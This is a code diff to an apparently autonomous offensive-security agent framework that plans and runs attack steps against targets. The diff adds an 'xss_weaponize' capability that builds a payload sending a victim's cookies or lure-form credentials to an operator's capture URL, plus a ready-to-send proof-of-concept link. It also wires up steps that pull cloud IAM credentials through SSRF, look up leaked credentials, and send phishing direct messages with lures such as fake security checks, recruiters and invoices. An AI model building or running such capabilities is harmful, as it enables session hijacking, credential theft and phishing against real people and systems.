@@ -9,7 +9,7 @@ from __future__ import annotations
 
 import os
 import re
-from typing import Any, Dict, List, Optional
+from typing import Any, Dict, List, Optional, Tuple
 
 from phantom.automation.belief import WorldModel, Finding
 from phantom.automation.guidance.commands import Capability, InputSlot
@@ -523,7 +523,8 @@ def _mk(cap_id: str, category: str, desc: str, inputs: List[InputSlot],
         detection_risk: float = 0.1, stealth_level: str = "passive",
         forceful: bool = False, timeout: int = 30, preconditions: List = None,
         banner: str = "", tools: List[str] = None,
-        exec_class: str = "shell_command", requires: List[str] = None) -> Capability:
+        exec_class: str = "shell_command", requires: List[str] = None,
+        engine=None) -> Capability:
     # P2-1: marker adapters are AUTO-classified — the honest stubs can
     # never masquerade as shell capabilities because the classification
     # is derived from the adapter's own return marker, not from a hand-set
@@ -542,7 +543,7 @@ def _mk(cap_id: str, category: str, desc: str, inputs: List[InputSlot],
         opsec_cost=opsec_cost, detection_risk=detection_risk,
         stealth_level=stealth_level, forceful=forceful, timeout=timeout,
         preconditions=preconditions or [], banner=banner or desc,
-        tools=tools or [], exec_class=exec_class,
+        tools=tools or [], exec_class=exec_class, engine=engine,
         requires=list(requires or []))
 
 
@@ -1218,8 +1219,46 @@ def _version_adapter(wm, slots):
     return "# no open services known yet — run scan_tcp first"
 
 
+def _raw_socket_ok() -> bool:
+    """True when this process can do raw-socket OS fingerprinting (-O).
+
+    nmap -O needs raw sockets: root on POSIX, and the Npcap/WinPcap packet
+    driver on Windows. Without them the scan FAILS outright ("requires
+    root privileges"), which marked os_detect dead on every unprivileged
+    Windows/macOS operator and inside containers. When unavailable the
+    adapter degrades to banner-based version detection instead.
+    """
+    try:
+        if hasattr(os, "geteuid"):
+            return os.geteuid() == 0
+    except Exception:
+        pass
+    if os.name == "nt":
+        root = os.environ.get("SystemRoot", r"C:\Windows")
+        for rel in (os.path.join("System32", "Npcap", "wpcap.dll"),
+                    os.path.join("System32", "wpcap.dll")):
+            try:
+                if os.path.exists(os.path.join(root, rel)):
+                    return True
+            except OSError:
+                continue
+    return False
+
+
 def _os_adapter(wm, slots):
-    return f"nmap -Pn -O {_effective_target(wm)}"
+    tool = _chosen_tool(wm, "os_detect", "nmap")
+    # Only nmap does remote OS fingerprinting (-O) today; the stamp still
+    # routes so a future implementer (xprobe2) plugs in without a rewrite,
+    # and a missing nmap is recorded as a choice instead of a silent default.
+    if tool == "__internal__":
+        tool = "nmap"
+    target = _effective_target(wm)
+    if tool == "nmap" and not _raw_socket_ok():
+        # no raw sockets here: -O would fail and kill the capability. The
+        # OS is still inferred from banners/version (and the reasoning
+        # layer's os_inferred), so the move keeps its use.
+        return f"{tool} -Pn -sV --version-intensity 5 {target}"
+    return f"{tool} -Pn -O {target}"
 
 
 def _http_probe_adapter(wm, slots):
@@ -1370,24 +1409,49 @@ def _redis_info_adapter(wm, slots):
     return f"redis-cli -h {host} -p {port} info"
 
 
+_SSH_BANNER_CACHE: Dict[Tuple[str, int], Tuple[float, str]] = {}
+
+
+def _internal_ssh_banner(host: str, port: int, ttl: float = 120.0) -> str:
+    """In-process SSH banner grab, memoised per (host, port) for the run.
+
+    The adapter can be asked for the same banner more than once (chain
+    preview, then execution); the probe is a live socket, so the second ask
+    returns the cached line instead of opening the socket again.
+    """
+    import time
+    key = (host, int(port))
+    now = time.time()
+    hit = _SSH_BANNER_CACHE.get(key)
+    if hit and now - hit[0] < ttl:
+        return hit[1]
+    from phantom.automation.fingerprint.probes import FingerprintEngine
+    r = FingerprintEngine(timeout=5.0).probe(host, port, service="ssh")
+    if r is None:
+        out = f"# internal ssh banner: no response from {host}:{port}"
+    elif not r.ok:
+        out = (f"# internal ssh banner: {r.error or 'no SSH banner'} "
+               f"on {host}:{port}")
+    elif not r.product:
+        out = (f"# internal ssh banner: connected but no SSH banner "
+               f"on {host}:{port}")
+    else:
+        out = f"FINGERPRINT:{r.port}:ssh:{r.product}:{r.version or '?'}"
+    _SSH_BANNER_CACHE[key] = (now, out)
+    return out
+
+
 def _ssh_banner_adapter(wm, slots):
     tool = _chosen_tool(wm, "ssh_banner", "nc")
     if tool == "__internal__":
         # pure-socket banner grab through the fingerprint engine — works
         # with NO external binary installed and (critically) never emits
         # the noisy 'nc at a closed port' failure: closed ports return a
-        # clean comment line the agent marks as self-sufficient.
-        from phantom.automation.fingerprint.probes import FingerprintEngine
+        # clean comment line the agent marks as self-sufficient. Memoised:
+        # the socket is opened at most once per (host, port) per run.
         host = _effective_target(wm)
         port = int(slots.get("port") or _service_port(wm, "ssh", 22))
-        r = FingerprintEngine(timeout=5.0).probe(host, port, service="ssh")
-        if r is None:
-            return f"# internal ssh banner: no response from {host}:{port}"
-        if not r.ok:
-            return f"# internal ssh banner: {r.error or 'no SSH banner'} on {host}:{port}"
-        if not r.product:
-            return f"# internal ssh banner: connected but no SSH banner on {host}:{port}"
-        return f"FINGERPRINT:{r.port}:ssh:{r.product}:{r.version or '?'}"
+        return _internal_ssh_banner(host, port)
     return f"nc -w 5 {_effective_target(wm)} {slots.get('port', '22')}"
 
 
@@ -2158,6 +2222,33 @@ def _cmdi_inject_endpoint(endpoint: str, command: str) -> Optional[str]:
                   lambda mm: f"{prefix}{param}={encoded}", endpoint, count=1)
 
 
+def _pick_xss_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
+    """Highest-score CONFIRMED reflected-XSS anomaly (endpoint known)."""
+    best = None
+    for f in wm.find("hunt_anomaly"):
+        v = f.value if isinstance(f.value, dict) else {}
+        if v.get("cls") != "xss" or not v.get("confirmed"):
+            continue
+        try:
+            score = float(v.get("score") or 0)
+        except (TypeError, ValueError):
+            score = 0.0
+        if best is None or score > best[0]:
+            best = (score, {"port": str(v.get("port") or "80"),
+                            "endpoint": v.get("endpoint") or "/",
+                            "name": v.get("name") or "",
+                            "evidence": v.get("evidence") or ""})
+    return best[1] if best else None
+
+
+def _has_confirmed_xss():
+    """Precondition: a CONFIRMED reflected-XSS anomaly with a known
+    endpoint."""
+    def _requires_xss(wm: WorldModel) -> bool:
+        return _pick_xss_candidate(wm) is not None
+    return _requires_xss
+
+
 def _has_confirmed_rce():
     """Precondition: a CONFIRMED command-execution candidate exists — a
     confirmed SSTI anomaly (endpoint known) or an RCE-kind exploit plan."""
@@ -2201,6 +2292,62 @@ def _pick_rce_candidate(wm: WorldModel) -> Optional[Dict[str, Any]]:
                           "msf_module": v.get("msf_module") or "",
                           "cve": v.get("cve") or ""})
     return best[1] if best else None
+
+
+def _xss_weaponize_adapter(wm, slots):
+    """Turn a CONFIRMED reflection into the session-theft asset.
+
+    The hunt engine proved the raw payload is reflected UNENCODED in an
+    HTML context; this builds the exfiltration payload that ships the
+    victim's session to the operator's capture URL, plus the ready-to-send
+    PoC URL at the exact injection point. Honest limit: delivery still
+    needs a victim, so this produces the WEAPON, not a compromise.
+    """
+    cand = _pick_xss_candidate(wm)
+    if cand is None:
+        raise ValueError("no confirmed XSS candidate")
+    from phantom.automation.exploit.xss import (
+        xss_exfil_payload, xss_poc_url)
+    exfil = str((slots or {}).get("exfil_url") or "").strip()
+    if not exfil:
+        raise ValueError("xss_weaponize requires the exfil_url slot "
+                         "(the operator's capture endpoint)")
+    steal = str((slots or {}).get("steal") or "cookie").lower()
+    payload = xss_exfil_payload(exfil, steal=steal)
+    poc = xss_poc_url(cand["endpoint"], payload)
+    return "\n".join([
+        f"XSS_EXFIL:steal={steal}",
+        f"XSS_ENDPOINT:{cand['endpoint']}",
+        f"XSS_POC:{poc or ''}",
+        f"XSS_PAYLOAD:{payload}",
+    ])
+
+
+def _xss_weaponize_interp(output, wm, slots):
+    """Parse XSS_EXFIL:/XSS_POC:/XSS_PAYLOAD: into an xss_exfil finding.
+    Line-prefixed (not space-split) because the payload contains spaces."""
+    from phantom.automation.belief import Finding
+    out = output or ""
+    if "XSS_EXFIL:" not in out:
+        return []
+    steal = endpoint = poc = payload = ""
+    for line in out.splitlines():
+        if line.startswith("XSS_EXFIL:"):
+            steal = line.split("=", 1)[1].strip() if "=" in line else ""
+        elif line.startswith("XSS_ENDPOINT:"):
+            endpoint = line.split(":", 1)[1].strip()
+        elif line.startswith("XSS_POC:"):
+            poc = line.split(":", 1)[1].strip()
+        elif line.startswith("XSS_PAYLOAD:"):
+            payload = line.split(":", 1)[1].strip()
+    if not payload:
+        return []
+    return [Finding(
+        kind="xss_exfil", key=f"xss:{endpoint or 'unknown'}",
+        value={"steal": steal, "endpoint": endpoint, "poc_url": poc,
+               "payload": payload},
+        confidence=0.85, source="xss_weaponize",
+        evidence=(payload or poc)[:300], target=wm.target)]
 
 
 def _rce_foothold_adapter(wm, slots):
@@ -3282,6 +3429,12 @@ CAPABILITIES = [
         "data beyond nmap -sV — no external tools required",
         [],
         ["fingerprint"], _fingerprint_adapter, _fingerprint_interp,
+        # IN-PROCESS engine: it opens sockets to 15+ protocols, so it must
+        # run at EXECUTION time through `run_engine` — never while a command
+        # is being built (the chain preview does that for every candidate).
+        # Misclassified as shell_command before: the FINGERPRINT: markers
+        # were then queued as a shell task, which could never work.
+        exec_class="in_process_engine", engine=_fingerprint_adapter,
         opsec_cost=1.5, detection_risk=0.2, stealth_level="stealth", timeout=60,
         preconditions=[_has_network_host(), _has_finding("service")],
         banner="deep fingerprint", tools=[]),
@@ -3394,11 +3547,30 @@ CAPABILITIES = [
         preconditions=[_has_network_host(), _has_finding("service")],
         banner="differential analysis", tools=[]),
 
+    _mk("xss_weaponize", "exploit",
+        "Turn a CONFIRMED reflected XSS into the session-theft asset: build "
+        "the exfiltration payload that ships document.cookie (or, in creds "
+        "mode, the lure form's fields) to the operator's capture URL, plus "
+        "the ready-to-send PoC URL at the confirmed injection point. "
+        "Delivery still needs a victim: this produces the weapon, not a "
+        "compromise.",
+        [_mk_slot("exfil_url", "str", True,
+                  "operator capture endpoint (a domain, not a bare IP)"),
+         _mk_slot("steal", "str", False, "cookie|creds")],
+        ["xss_exfil"], _xss_weaponize_adapter, _xss_weaponize_interp,
+        exec_class="in_process_engine",
+        opsec_cost=0.4, detection_risk=0.1, stealth_level="active", timeout=20,
+        preconditions=[_has_web_service(), _has_confirmed_xss()],
+        banner="weaponize XSS", tools=[]),
+
     _mk("rce_foothold", "exploit",
         "Turn a CONFIRMED code-execution candidate into a verified foothold "
         "(no credentials): SSTI -> command execution marker, SSRF -> cloud "
         "metadata IAM creds, RCE-class exploit plan -> msf session watch",
-        [], ["rce_foothold"], _rce_foothold_adapter, _rce_foothold_interp,
+        # effects must be COMPLETE: the SSRF channel also emits
+        # `cloud_creds` (metadata IAM), and the planner's reverse index
+        # already lists rce_foothold as a source for it.
+        [], ["rce_foothold", "cloud_creds"], _rce_foothold_adapter, _rce_foothold_interp,
         opsec_cost=2.0, detection_risk=0.5, stealth_level="active",
         forceful=True, timeout=90,
         preconditions=[_has_network_host(), _has_confirmed_rce()],
@@ -3523,7 +3695,11 @@ CAPABILITIES = [
 
     _mk("breach_check", "osint",
         "Breach-dump lookup for an email/username -> leaked credentials",
-        [], ["creds"], _breach_check_adapter, _social_interp,
+        # effects must be COMPLETE: the interpreter also emits
+        # `breach_exposure` (the marker line), and the planner's reverse
+        # index lists it here. Leaving it out made a plan whose last step
+        # was breach_check report complete=False even after it succeeded.
+        [], ["creds", "breach_exposure"], _breach_check_adapter, _social_interp,
         opsec_cost=0.6, detection_risk=0.05, stealth_level="passive", timeout=30,
         preconditions=[_has_target_type("email", "username")],
         banner="breach check"),
@@ -3583,7 +3759,11 @@ CAPABILITIES = [
                   "wrong_recipient|found_file|is_this_you|mentioned_doc "
                   "(innocuous, no link) or security_verify|recruiter|collab|"
                   "prize|invoice (flagged: link in the message)")],
-        ["dm_sent", "phish"], _dm_adapter, _social_interp,
+        # effects must be COMPLETE: the interpreter also emits `dm_stage`
+        # and `dm_plan` (dm_stage2's precondition is exactly `dm_stage`),
+        # which the planner's reverse index already attributes here.
+        ["dm_sent", "phish", "dm_stage", "dm_plan"], _dm_adapter,
+        _social_interp,
         opsec_cost=2.0, detection_risk=0.6, stealth_level="active", timeout=60,
         preconditions=[_has_target_type("username", "email"),
                        _dm_ready()],
